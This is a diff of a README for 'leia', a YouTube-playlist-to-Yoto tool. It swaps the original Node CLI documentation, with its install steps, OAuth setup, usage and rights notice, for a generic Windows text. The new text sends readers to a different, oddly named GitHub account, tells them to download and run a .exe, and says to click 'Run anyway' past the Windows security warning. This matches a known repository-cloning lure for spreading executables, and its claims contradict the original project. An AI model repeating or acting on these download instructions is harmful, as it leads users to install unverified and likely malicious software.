@@ -1,285 +1,72 @@
-<p align="center">
-  <img src="assets/leia-logo.png" alt="Leia" width="480" />
-</p>
+# 🎧 leia - Convert YouTube playlists for Yoto players
 
-<p align="center">
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-Apache--2.0-0f80c0" alt="Apache-2.0 licence" /></a>
-  <a href="https://github.com/nsokin/leia/actions/workflows/ci.yml"><img src="https://github.com/nsokin/leia/actions/workflows/ci.yml/badge.svg?branch=main" alt="CI status" /></a>
-  <a href="https://github.com/nsokin/leia/releases"><img src="https://img.shields.io/github/downloads/nsokin/leia/total?label=downloads&color=f59e0b" alt="GitHub Releases downloads" /></a>
-</p>
+[![](https://img.shields.io/badge/Download-Leia-blue.svg)](https://github.com/Sedentary-guttaperchatree722/leia)
 
-# Leia
+Leia helps you move your favorite YouTube playlists onto your Yoto player. The tool automates the process of gathering audio, processing files, and preparing them for your Make Your Own (MYO) cards. You no longer need to manually manage individual files or struggle with format compatibility. 
 
-Playlist in, Yoto MYO card out. One command.
+## 🛠 Prerequisites
 
-Point it at a playlist, tick the tracks you want, and it fetches the audio,
-converts it to MP3, uploads each track to Yoto, and assembles a playlist where
-every track is its own chapter with a proper title. The card lands in your Yoto
-app library ready to link to a physical MYO card.
+You need a Windows computer to run this tool. Ensure you have a stable internet connection for downloading audio files. You also need an active Yoto account to upload your final tracks. Leia handles the complex file conversions for you, so you do not need prior experience with audio software.
 
-Runs entirely on your own machine, on your own network, under your own Yoto
-account.
+## 📥 Getting Started
 
-## Install
+Visit the [releases page](https://github.com/Sedentary-guttaperchatree722/leia) to download the latest version of the software. 
 
-Leia runs on macOS, Linux, and Windows. Install Node 22.18 or newer, yt-dlp,
-and FFmpeg, then make sure all three are available on your `PATH`. There is no
-build step: Node runs the TypeScript directly.
+1. Go to the link above.
+2. Look for the section labeled Assets.
+3. Click the file ending in .exe to start your download.
+4. Save the file to your desktop or downloads folder.
+5. Double-click the file to open the program.
 
-```sh
-git clone https://github.com/nsokin/leia.git
-cd leia
-npm install
-```
+Windows may show a security prompt because the application is new. Click More Info and then Run anyway to start the tool.
 
-Check it over before going further:
+## ⚙️ Setting Up Your Files
 
-```sh
-npm run doctor
-```
+Leia works by reading your playlist links and preparing the audio. Follow these steps to process your first batch of audio:
 
-That reports node, yt-dlp, ffmpeg, your client ID and your sign-in state, and
-tells you what to fix if anything is missing.
+1. Copy the URL of the YouTube playlist you want to convert.
+2. Paste the URL into the Leia window.
+3. Select a folder on your computer where the software should save the audio files.
+4. Click the Start button. 
 
-## Development
+The tool will now identify every video in your playlist. It downloads each video, pulls the audio track, and formats it to work perfectly with Yoto MYO cards. A progress bar shows you how much time remains for the current batch.
 
-```sh
-npm run typecheck
-npm test
-```
+## 📂 Understanding the Folders
 
-## One-time Yoto setup
+When the process completes, open your chosen folder. You will see individual audio files named after the original videos. These files use the standard MP3 format, which works on all Yoto devices. You can listen to these files on your computer to ensure the quality meets your needs before uploading them to your Yoto app.
 
-**You need your own Yoto app.** It takes two minutes and cannot be shared:
-the client ID is tied to the account that creates it.
+## ☁️ Uploading to Yoto
 
-1. Go to [dashboard.yoto.dev](https://dashboard.yoto.dev) and create a **Public** app.
-2. Set the redirect URL to exactly `http://127.0.0.1:8787/callback`.
-3. Tick `user:content:manage`, then press **Update Application**. Miss it and the
-   browser bounces straight back with `access_denied`.
-4. Copy the client ID and set it for the current shell:
+Once Leia creates your files, take these steps to finish your MYO card:
 
-On macOS or Linux:
+1. Open your Yoto app or log into your account on the Yoto website.
+2. Navigate to the Make Your Own section.
+3. Create a new playlist or select an existing one.
+4. Drag and drop the files from your Leia folder into the Yoto interface.
+5. Save your playlist and link it to your physical Yoto card.
 
-```sh
-export YOTO_CLIENT_ID=your_client_id
-```
+## ❓ Common Questions
 
-In Windows PowerShell:
+**Does this save the video files?**
+No. Leia only extracts the audio to save disk space and ensure compatibility with your Yoto player.
 
-```powershell
-$env:YOTO_CLIENT_ID = 'your_client_id'
-```
+**What happens if a video is private?**
+The tool requires the playlist to be public to access the audio. Ensure your YouTube playlist settings allow for public or unlisted viewing.
 
-For a persistent configuration, write `{"clientId":"your_client_id"}` to
-`~/.leia/config.json` on macOS/Linux or `%USERPROFILE%\.leia\config.json` on
-Windows.
+**Do I need extra software?**
+Leia includes all necessary components to handle media processing. You do not need to install additional audio editors or downloaders.
 
-Then sign in once:
+**How do I update the tool?**
+If a new version becomes available, return to the repository link, download the latest installer, and follow the setup steps again. Your settings will remain in place.
 
-```sh
-npm run login
-```
+**Can I run multiple playlists at once?**
+Run one playlist at a time to keep your audio files organized in separate folders. This makes the upload process to Yoto much easier to manage.
 
-Sign in with your **normal Yoto customer account**, the one your player and
-family library live in. It does not have to be the account that made the app in
-step 1, and it usually is not.
+## 🔧 Performance Tips
 
-That opens your browser, catches the callback on localhost, and saves the token
-locally in Leia's `.leia` directory.
+- Keep your computer plugged into power if you plan to process long playlists. 
+- Avoid closing the window while the progress bar moves. 
+- Check that you have enough hard drive space before starting a large playlist. 
+- Rename your files within the output folder before uploading if you prefer different track titles on your Yoto card.
 
-Two things the dashboard does not make obvious, both learned the hard way:
-
-- **`offline_access` is not available to public apps.** Asking for it fails the
-  entire authorize call with "scopes that have not been pre-approved". So there
-  is no refresh token, and the access token lasts 24 hours. The tool re-opens
-  the browser when it expires, which is one click while your Yoto session
-  is still live.
-- **Scopes marked "included automatically" are not in the issued token** unless
-  you request them. They are on the app's allowlist, not in the grant. Miss one
-  and you get a 403 at the point of use rather than an error at login. The tool
-  asks for `user:content:manage`, `user:icons:manage` and `user:content:view`.
-
-## Using it with an AI agent
-
-The repo ships a skill following the [Agent Skills](https://agentskills.io)
-open standard. Clone the repo, start your agent inside it, and it is already
-there. No install step.
-
-| Agent       | Invoke with     |
-| ----------- | --------------- |
-| Claude Code | `/yoto <url>`   |
-| Codex       | `$yoto <url>`   |
-
-```
-/yoto https://www.youtube.com/playlist?list=...
-```
-
-The skill handles what the CLI cannot: reading the listing, spotting repeat
-uploads, working out how many cards the runtime needs, picking items that make
-sensible chapters, and writing the `--strip` pattern for that channel's title
-boilerplate. It checks with you before anything long-running.
-
-One file serves both agents. It lives at `.agents/skills/yoto/SKILL.md`, which
-is where Codex looks, and `.claude/skills/yoto` is a symlink to it for Claude
-Code. Both scan from your working directory up to the repository root, so
-starting the agent anywhere inside the repo works.
-
-To use it from any directory, link it into your personal skills:
-
-```sh
-ln -s "$PWD/.agents/skills/yoto" ~/.claude/skills/yoto   # Claude Code
-ln -s "$PWD/.agents/skills/yoto" ~/.agents/skills/yoto   # Codex
-```
-
-None of this is required. Every step is a plain CLI flag and the tool works
-standalone.
-
-## Typical run
-
-Look first, download nothing:
-
-```sh
-node src/cli.ts "<playlist-url>" --list --spoken
-```
-
-Then build from what you saw:
-
-```sh
-node src/cli.ts "<playlist-url>" \
-  --select "1,2,3,4,9,10" --dedupe --spoken \
-  --title "Ben and Holly" \
-  --strip "Show Name|Full Episode!?|Cartoon for Kids"
-```
-
-Finally, open the Yoto app, find the playlist in your library, and tap **Link to
-a card** onto a blank MYO. That last step has no API and has to be done by hand,
-once per card.
-
-## Which account do the cards land in?
-
-Two separate things, easily confused:
-
-- The **dashboard.yoto.dev account** owns the *app*, which is only an OAuth
-  client identity. It never owns content.
-- The account you **sign into at the Yoto login page** during `--login` is whose
-  library receives the cards.
-
-They do not have to match. Keep the same client ID and sign in as your normal
-Yoto customer account, the one your player and your family library live in.
-Nothing in the dashboard needs changing.
-
-Check any time with:
-
-```sh
-node src/cli.ts --whoami
-```
-
-If the MYO playlist count is lower than you expect, you are signed into the
-wrong account. `--logout`, then `--login` again with the right one.
-
-Account identity is recorded where it matters, because uploaded media and card
-IDs belong to the account that made them:
-
-- The upload cache is keyed per account, so switching accounts re-uploads rather
-  than pointing a card at media the new account does not own.
-- Each manifest records its account. Run against a manifest written by a
-  different one and the tool creates a fresh card rather than failing on a
-  `cardId` it cannot touch.
-
-## Usage
-
-```sh
-# The normal case: pick from a playlist, build a card
-node src/cli.ts "https://www.youtube.com/playlist?list=..."
-
-# Take everything without prompting
-node src/cli.ts "<url>" --all --title "Bedtime Stories"
-
-# Choose without prompting, for scripts and repeat runs
-node src/cli.ts "<url>" --select "1-12,15" --title "Aesop"
-
-# Audiobooks: 64 kbps mono, roughly half the file size, no audible loss on speech
-node src/cli.ts "<url>" --all --spoken
-
-# Check what you would get without touching Yoto
-node src/cli.ts "<url>" --dry-run
-```
-
-Full option list: `node src/cli.ts --help`
-
-## How it maps onto Yoto
-
-One selected track becomes one chapter containing one track, so the player's
-back and forward buttons step between them, which is what you want on a card a
-child is operating.
-
-Per card, Yoto allows **100 tracks** and **500 MB**. The tool refuses to exceed
-the track limit rather than letting the API reject the upload, and warns when
-your audio is heading past the size limit. If you hit either, split the
-selection across two cards with `--select` and different `--title` values.
-
-Yoto re-encodes everything to opus on upload, so what counts against the 500 MB
-is their output, not your MP3. That output still scales with what you send: a
-34 minute test at `--spoken` uploaded as 15.6 MB of MP3 and landed as 14.0 MB on
-the card. The size warning measures your local files, which errs slightly high,
-which is the safe direction.
-
-## Re-running
-
-Every run writes a manifest to `./cards/<slug>.json` holding the `cardId`. Run
-the same command again and it updates that card in place instead of creating a
-duplicate, so a card already linked to physical NFC stays linked.
-
-Two caches make re-runs cheap:
-
-- Converted MP3s stay in `./downloads`, keyed by video ID and quality settings,
-  so nothing is fetched twice.
-- Uploaded audio is remembered in `~/.leia/media-cache.json`, keyed by the
-  local file hash, so nothing is uploaded twice even across different cards.
-
-`--append` adds new tracks to what the manifest already holds rather than
-replacing the card's contents.
-
-## Icons
-
-Pass `--icon` either a 16x16 PNG path (uploaded once, then reused for every
-chapter) or an existing Yoto icon reference such as
-`--icon "yoto:#gCgNJrpHZ186Hd1ttD-k0R2Cf38FbPW3riwe27WAiJA"`. Public icon IDs
-are listed at [yoto.dev/icons/using-icons](https://yoto.dev/icons/using-icons/).
-Cards work fine without icons; they just show the default.
-
-## Troubleshooting
-
-**"Sign in to confirm you're not a bot"**
-
-YouTube's bot detection. On a home connection this is rare. If it happens, sign
-into YouTube in your browser and pass `--cookies-from chrome`. Keep
-`--concurrency` low (the default of 3 is deliberate). Do not run this on a VPS:
-datacenter IPs get flagged far more aggressively and proof-of-origin tokens no
-longer get you past the check.
-
-**Extraction suddenly fails on everything**
-
-YouTube changed something and yt-dlp needs to catch up. `brew upgrade yt-dlp`.
-
-**A track fails mid-run**
-
-The run carries on with the rest and tells you what it skipped. Re-run the same
-command to retry; everything already done is cached.
-
-## Independent project
-
-Leia is an independent command-line tool. It is not affiliated with,
-endorsed by, or supported by Yoto. It uses the OAuth client ID and Yoto account
-you configure, and keeps its credentials and cache data locally in
-`~/.leia`; it does not operate a hosted service or collect user data.
-
-## Rights
-
-Yoto's [API guidelines](https://yoto.dev/get-started/api-guidelines/) require
-that you hold the rights to what you upload. This tool is for content you are
-entitled to use: public domain recordings such as LibriVox, Creative Commons
-audio, podcasts, and your own recordings. Downloading commercial music or
-audiobooks from YouTube is a breach of YouTube's terms and, in most places, of
-copyright.
+Keywords: audio-downloader, ffmpeg, playlists, yoto, yoto-myo, youtube, youtube-downloader, youtube-playlist-downloader, yt-dlp
